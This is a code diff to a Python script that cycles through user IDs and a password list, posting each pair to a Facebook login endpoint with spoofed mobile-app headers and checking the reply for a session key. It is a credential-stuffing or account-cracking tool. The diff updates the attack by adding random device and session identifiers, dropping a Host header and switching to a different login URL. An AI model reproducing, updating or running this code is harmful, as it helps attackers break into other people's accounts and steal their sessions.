@@ -1,4 +1,3 @@
-
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules...\n It will take some seconds...')
@@ -489,6 +488,9 @@ def api5(ids,names,passlist):
                                         'credentials_type':'device_based_login_password',
                                         "source": "device_based_login",
                                         "family_device_id": str(uuid.uuid4()),
+                                        "session_id": str(uuid.uuid4()),
+                                        "advertiser_id": str(uuid.uuid4()),
+                                        "reg_instance": str(uuid.uuid4()),
                                         'error_detail_type':'button_with_disabled',
                                         'source':'login','format':'json',
                                         'generate_session_cookies':'1',
@@ -508,7 +510,6 @@ def api5(ids,names,passlist):
                                         
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'Host': 'graph.facebook.com',
                                         'x-fb-sim-hni':'45201',
                                         'x-fb-connection-type':'MOBILE.LTE',
                                         'X-Tigon-Is-Retry': 'False',
@@ -527,7 +528,7 @@ def api5(ids,names,passlist):
                                         'X-FB-Client-IP': 'True',
                                         'X-FB-Server-Cluster': 'True',
                                         'x-fb-http-engine':     'Liger'}
-                                url =   'https://graph.facebook.com/auth/login'
+                                url =   'https://b-graph.facebook.com/method/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
@@ -559,5 +560,4 @@ except requests.exceptions.ConnectionError:
         exit()
 except Exception as e:pass
 menu()
-
 
